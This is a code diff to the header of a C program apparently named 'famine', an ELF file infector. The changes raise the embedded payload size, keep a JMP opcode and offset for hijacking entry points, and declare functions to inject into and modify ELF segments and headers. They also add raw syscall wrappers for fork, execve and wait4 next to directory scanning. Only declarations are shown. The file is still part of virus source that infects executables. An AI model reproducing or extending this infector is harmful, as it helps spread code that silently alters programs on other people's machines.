@@ -15,6 +15,10 @@
 #include <stdbool.h>
 #include <dirent.h>
 #include <elf.h>
+#include <sys/types.h>
+#include <sys/time.h>
+#include <sys/resource.h>
+#include <sys/wait.h>
 
 ////////////////////////////////////////////////////////////////////////////////
 /// DEFINES
@@ -28,7 +32,7 @@
 #define JMP_OFFSET 66
 #define JMP_OPCODE 0xe9
 
-#define PAYLOAD_SIZE 5387
+#define PAYLOAD_SIZE 5675
 
 #define BUFF_SIZE 1024 * 1024
 
@@ -64,7 +68,7 @@ struct s_info
 	int fd;
 	void *ptr;
 	size_t size;
-	const char *name;
+	char *name;
 
 	Elf64_Phdr *note;
 	Elf64_Phdr *data;
@@ -84,17 +88,19 @@ struct criteria
 
 // FAMINE
 void constructor(void);
-__attribute__((hot)) void famine(const char *file, const size_t m_entry);
+__attribute__((hot)) void famine(char *file);
 void modify_segment(struct s_info *info);
 void modify_header(struct s_info *info, Elf64_Ehdr *header);
-void inject(const struct s_info *info, const size_t m_entry);
-void test(void);
+void inject(struct s_info *info);
 
 // INFO
-struct s_info get_info(const char *file);
+struct s_info get_info(char *file);
 void release_info(struct s_info *info);
 
 // LIB
+pid_t _fork(void);
+int _execve(const char *filename, char *const argv[], char *const envp[]);
+pid_t _wait4(pid_t pid, int *wstatus, int options, struct rusage *rusage);
 int _getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
 int _close(int fd);
 int _open(const char *pathname, int flags, long mode);
